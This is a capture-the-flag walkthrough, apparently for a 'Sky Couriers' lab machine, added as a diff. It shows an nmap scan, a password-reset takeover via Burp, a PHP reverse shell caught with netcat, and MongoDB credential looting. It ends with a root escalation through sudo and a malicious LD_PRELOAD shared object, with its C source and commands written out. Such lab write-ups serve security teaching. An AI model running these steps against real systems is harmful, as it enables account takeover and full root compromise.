@@ -1,0 +1,71 @@
+nmap -sC -sV $IP
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
+|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
+|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Sky Couriers
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Visiting the website we can register as a user.
+
+we find a profile page in which we can upload a profile image, but only admin have access. With that being said we retrieve the admin's email "admin@sky.thm".
+
+Another page that we can visit is the reset user in which the username field is non writable. We use burp suite to intercept the request and change from our email to admin email. Now we have admin access to the page. We can upload our .php reverse shell but we don't know where the file is uploaded so we have to find the path to the file.
+
+using gobuster to the background in the http://$IP/v2/
+
+but lookingthrough the source code we can find an /v2/profileimages/
+
+open a nc -lvnp 4444 in the attacker's pc and we visit http://$IP/v2/profileimages/reverse_shell.php
+
+and we get www-data and retrieve the user.txt
+we upgrade our shell python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+we can see in the webdeveloper if we use ls -la a .mysql_history file so mysql might be open. but we try mysql in the terminal but it doesnt work.
+
+we use netstat -a but it's not installed then we use ss -tulnp
+
+port 33060, 3306 for mysql
+port27017 is for mongo
+
+From the investigation, we conclude that MongoDB is indeed running. And we can now spin up MongoDB by running mongo on the terminal.
+
+show dbs
+use backup
+show collections;
+db.user.find()
+
+we find the developer passwd
+
+ssh webdeveloper@$IP 
+
+
+enumerating the user using sudo -V i found version 1.8.31 that it might be vulnerable to CVE-2021-3156
+
+after trying sudoedit -s Y it didn't work so it seems it might be patched.
+
+Enumerating,we use thesudo -l command to list all commands the webdeveloper user can run using sudo.
+we find LD_PRELOAD is a function that allows any program to use shared libraries
+
+we write a c code
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>void _init() {
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/bash");
+}
+
+We can save this code as shell.c and compile it using gcc into a shared object file
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
+
+This will result in a shell spawn with root privileges and we get the root flag.
